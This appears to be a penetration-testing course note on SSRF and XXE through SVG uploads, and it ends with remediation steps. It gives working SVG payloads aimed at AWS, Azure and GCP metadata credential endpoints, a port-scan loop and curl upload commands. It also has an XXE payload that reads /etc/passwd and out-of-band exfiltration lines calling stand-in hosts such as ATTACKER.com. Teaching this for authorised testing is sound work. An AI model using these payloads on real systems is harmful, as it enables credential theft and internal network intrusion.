---
tags: [vapt, file-upload, ssrf, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.08 File Upload + SSRF (SVG with SSRF payload)"
---

# 22.08 — File Upload + SSRF (SVG with SSRF payload)

## SVG Files Can Trigger SSRF

```
SVG = SCALABLE VECTOR GRAPHICS
  XML-based image format!
  
  SVG CAN INCLUDE:
  - JavaScript: <script> tags → XSS!
  - External references: <image href="URL"> → SSRF!
  - External stylesheets: <stylesheet> → SSRF!
  - Filters with feImage: → SSRF!
  
  IF SERVER PROCESSES/RENDERS SVG:
  → Server-side XML parser fetches external URLs → SSRF!
  
  COMMON SCENARIO:
  App converts SVG to PNG (for thumbnails)
  Uses librsvg, ImageMagick, or similar
  → These tools fetch <image href="INTERNAL_URL"> during rendering
  → SSRF!
```

---

## SVG SSRF Payloads

```xml
<!-- BASIC SSRF — image href: -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink" 
     width="100" height="100">
  <image href="http://169.254.169.254/latest/meta-data/" 
         height="100" width="100"/>
</svg>

<!-- AWS METADATA SPECIFIC: -->
<image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>

<!-- INTERNAL NETWORK SCAN: -->
<image href="http://10.0.0.1:8080/"/>
<image href="http://localhost:6379/"/>  <!-- Redis? -->
<image href="http://127.0.0.1:9200/"/> <!-- Elasticsearch? -->

<!-- USING XLINK:HREF (older SVG standard): -->
<image xlink:href="http://169.254.169.254/latest/meta-data/" 
       height="100" width="100"/>

<!-- USE FILTER (might bypass restrictions): -->
<filter id="filter">
  <feImage xlink:href="http://169.254.169.254/"/>
</filter>
<rect filter="url(#filter)" width="100" height="100"/>

<!-- CSS IMPORT SSRF: -->
<style>
  @import url("http://169.254.169.254/latest/meta-data/");
</style>

<!-- EXTERNAL ENTITY IN SVG (also XXE!): -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## What to Target with SSRF via SVG

```
AWS CLOUD METADATA (http://169.254.169.254/):
  /latest/meta-data/                        → list of paths
  /latest/meta-data/instance-id             → EC2 instance ID
  /latest/meta-data/iam/security-credentials/ → role name
  /latest/meta-data/iam/security-credentials/ROLE_NAME → ACCESS KEYS!
  /latest/user-data                         → user data script (may have secrets)
  
AZURE METADATA (http://169.254.169.254/metadata/instance?api-version=2021-01):
  Headers: Metadata: true
  → Returns subscription ID, VM info
  
GCP METADATA (http://metadata.google.internal/computeMetadata/v1/):
  Headers: Metadata-Flavor: Google
  → Service account tokens, project info

INTERNAL SERVICES:
  http://localhost:6379/        → Redis (try sending commands)
  http://localhost:9200/        → Elasticsearch
  http://localhost:27017/       → MongoDB
  http://localhost:8080/        → Internal app
  http://internal.service/admin → Internal admin panel
  
HOW TO GET RESPONSE:
  If SVG is rendered → response embedded in rendered image!
  Use Burp Collaborator for OOB (out-of-band) detection:
  <image href="http://YOUR_COLLABORATOR_ID.oastify.com/"/>
  → Collaborator receives request → SSRF confirmed!
  
  Exfil via URL if text is embedded:
  <image href="http://your-server.com/ssrf?data={RESPONSE}"/>
  (If app supports URL references in SVG and returns content as text)
```

---

## Detecting SSRF from SVG Upload

```bash
# STEP 1: CREATE MALICIOUS SVG:
cat > ssrf_test.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100" height="100">
  <image href="http://BURP_COLLABORATOR.oastify.com/ssrf-test"
         height="100" width="100"/>
</svg>
EOF

# STEP 2: UPLOAD THE SVG:
curl -X POST https://target.com/upload-profile-pic \
  -b "session=YOUR_SESSION" \
  -F "file=@ssrf_test.svg;type=image/svg+xml"

# STEP 3: CHECK BURP COLLABORATOR:
# Did the server make an HTTP request to your collaborator?
# → SSRF confirmed via SVG upload!

# STEP 4: TARGET AWS METADATA:
cat > aws_ssrf.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100" height="100">
  <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
         height="100" width="100"/>
</svg>
EOF

# UPLOAD AND: Check if response or rendered image contains AWS metadata!
# Some renderers embed the fetched content in the resulting image
# Use Burp's "Show response in browser" or decode the image

# STEP 5: INTERNAL PORT SCAN:
for PORT in 22 80 8080 8443 6379 9200 27017 3306 5432; do
  cat > "scan_$PORT.svg" << EOF
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image href="http://127.0.0.1:$PORT/" height="1" width="1"/>
</svg>
EOF
  # Upload and check response time (longer = port open!)
done
```

---

## XXE via SVG Upload

```xml
<!-- SVG IS XML → XXE IS POSSIBLE! -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="40">&xxe;</text>
</svg>

<!-- IF RENDERER PROCESSES THIS: -->
<!-- → Reads /etc/passwd → embeds in image text! -->
<!-- → Rasterize/convert to PNG → text visible in image! -->

<!-- OOB XXE VIA SVG: -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "http://ATTACKER.com/evil.dtd">
  %remote;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&send;</text>
</svg>

<!-- evil.dtd: -->
<!-- <!ENTITY % file SYSTEM "file:///etc/passwd"> -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER.com/?data=%file;'>"> -->
<!-- %all; -->
```

---

## Fix

```
PREVENTING SSRF VIA SVG:

1. DON'T RENDER SVG SERVER-SIDE:
   → If you don't process SVG → SSRF doesn't trigger!
   → Serve SVG as-is (just save and serve, no rendering)
   → BUT: if served as text/html or same-origin → XSS risk!

2. DISABLE NETWORK ACCESS IN SVG RENDERER:
   # librsvg (Rust/C):
   # Use librsvg with no-external flag:
   rsvg-convert --no-external-files input.svg -o output.png
   
   # ImageMagick policy.xml:
   <policy domain="url" rights="none" pattern="*"/>
   <policy domain="external" rights="none" pattern="*"/>

3. SANDBOX THE SVG RENDERER:
   Run in: seccomp sandbox, network namespace without internet
   → Even if SSRF triggered → no response (or only reaches known IPs)

4. SERVE SVG ON DIFFERENT DOMAIN (or Content-Type):
   Instead of: https://target.com/uploads/file.svg
   Serve as: https://static.target-cdn.com/file.svg (different origin)
   → XSS doesn't affect main app (cross-origin)

5. IF MUST RENDER — PARSE SAFELY:
   Use sanitization library to strip external references before rendering:
   SVG sanitizers: DOMPurify (JS), svg-sanitizer (PHP), lxml sanitize (Python)

6. ALLOWLIST WHAT SVG CAN REFERENCE:
   Parse SVG XML → find all href/xlink:href → validate against allowlist
   Only allow https://cdn.example.com/* → block everything else
```

---

## Related Notes
- [[13 - SSRF — What is SSRF]] — SSRF module
- [[09 - File Upload + XSS (SVG with XSS payload)]] — XSS via SVG
- [[10 - File Upload + XXE (malicious DOCX/XLSX)]] — XXE via file upload
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
